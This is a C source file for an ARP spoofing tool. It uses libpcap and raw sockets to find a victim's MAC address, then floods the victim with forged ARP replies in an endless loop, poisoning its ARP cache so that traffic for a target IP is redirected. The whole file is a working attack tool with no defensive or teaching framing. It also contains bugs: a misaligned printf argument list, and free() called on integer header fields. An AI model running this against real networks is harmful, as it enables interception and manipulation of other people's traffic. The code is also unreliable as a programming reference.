#include <stdio.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <unistd.h>

typedef enum _ARP_OPCODE
{
	ARP_Request = 1,
	ARP_Reply = 2,
} ARP_OPCODE;

typedef struct _ETHER_HEADER
{
	u_int8_t destHA[6];
	u_int8_t sourceHA[6];
	u_int16_t type;
} __attribute__((packed)) ETHER_HEADER, *LPETHER_HEADER;

typedef struct _ARP_HEADER
{
    u_int16_t hdType;
    u_int16_t ptType;
    u_char hdAL;
    u_char ptAL;
    u_int16_t operationCode;
    u_char senderHA[6];
    u_int32_t senderIP;
    u_char targetHA[6];
    u_int32_t targetIP;
} __attribute__((packed)) ARP_HEADER, *LPARP_HEADER;


int main(int argc, char **argv)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	char *dev, *sender_ip, *target_ip;
	pcap_t *handle;
	u_char packet[1000];
	struct ifreq if_mac, if_ip;
	uint8_t localMacAddress[6];
	uint32_t localIPAddress;
	int sockfd;

	if (argc != 4)
	{
		printf("Usage: %s [interface] [sender ip] [target ip]\n", argv[0]);
		return 2;
	}
	dev = argv[1];
	sender_ip = argv[2];
	target_ip = argv[3];

	handle = pcap_open_live(dev, BUFSIZ, 1, 300, errbuf);
	if (handle == NULL)
	{
		printf("Wrong device %s: %s\n", dev, errbuf);
		return 2;
	}
	if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == -1)
	{
		printf("Raw socket error in opening.\n");
		return 2;
	}
	
	// Getting local MAC Address and IP
	strncpy(if_mac.ifr_name, dev, IFNAMSIZ - 1);
	strncpy(if_ip.ifr_name, dev, IFNAMSIZ - 1);
	ioctl(sockfd, SIOCGIFHWADDR, &if_mac);
	ioctl(sockfd, SIOCGIFADDR, &if_ip);
	memcpy(localMacAddress, if_mac.ifr_hwaddr.sa_data, 6);
	localIPAddress = ((struct sockaddr_in *)&if_ip.ifr_addr)->sin_addr.s_addr;

	// ARP packet making
	LPETHER_HEADER etherHeader = (LPETHER_HEADER)packet;

	memcpy(etherHeader->destHA, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
	memcpy(etherHeader->sourceHA, localMacAddress, 6);
	etherHeader->type = htons(ETHERTYPE_ARP);

	LPARP_HEADER arpHeader = (LPARP_HEADER)(packet + sizeof(ETHER_HEADER));
	arpHeader->hdType = htons(1);
	arpHeader->ptType = htons(ETHERTYPE_IP);
	arpHeader->hdAL = 6;
	arpHeader->ptAL = 4;
	arpHeader->operationCode = htons(ARP_Request);
	arpHeader->senderIP = localIPAddress;
	arpHeader->targetIP = inet_addr(sender_ip);
	memcpy(arpHeader->senderHA, localMacAddress, 6);
	memcpy(arpHeader->targetHA, "\x00\x00\x00\x00\x00\x00", 6);

	printf("Getting victim's MAC Address...\n");
	pcap_sendpacket(handle, packet, sizeof(ETHER_HEADER) + sizeof(ARP_HEADER));

	const u_char *cap_pk;
	struct pcap_pkthdr *header;
	uint8_t victimHA[6];
	while (pcap_next_ex(handle, &header, &cap_pk) >= 0)
	{
		if (!cap_pk) // Null packet check
			continue;

		LPETHER_HEADER capEtherHeader = (LPETHER_HEADER)cap_pk;
		if (htons(capEtherHeader->type) != ETHERTYPE_ARP)
			continue;

		LPARP_HEADER capArpHeader = (LPARP_HEADER)(cap_pk + sizeof(ETHER_HEADER));
		if (htons(capArpHeader->ptType) == ETHERTYPE_IP &&
			htons(capArpHeader->operationCode) == ARP_Reply &&
			capArpHeader->senderIP == arpHeader->targetIP) // Check sender is equal to victim
		{
			printf("Sender IP :  %s\n", sender_ip);
			printf("Mac Address :  %02X:%02X:%02X:%02X:%02X:%02X\n", sender_ip,
				capArpHeader->senderHA[0], capArpHeader->senderHA[1], capArpHeader->senderHA[2],
				capArpHeader->senderHA[3], capArpHeader->senderHA[4], capArpHeader->senderHA[5]);

			memcpy(victimHA, capArpHeader->senderHA, 6);
			break;
		}
	}

	// Start ARP Spoofing
	memcpy(etherHeader->destHA, victimHA, 6);
	arpHeader->operationCode = htons(ARP_Reply);
	arpHeader->senderIP = inet_addr(target_ip);
	arpHeader->targetIP = inet_addr(sender_ip);
	memcpy(arpHeader->targetHA, victimHA, 6);

	printf("ARP spoofing start\n");
	
	while(1)
	{
		pcap_sendpacket(handle, packet, sizeof(ETHER_HEADER) + sizeof(ARP_HEADER));
		usleep(1000);	
	}

	pcap_close(handle);
	free(arpHeader->senderIP);
	free(arpHeader->targetIP);
	return 0;
}
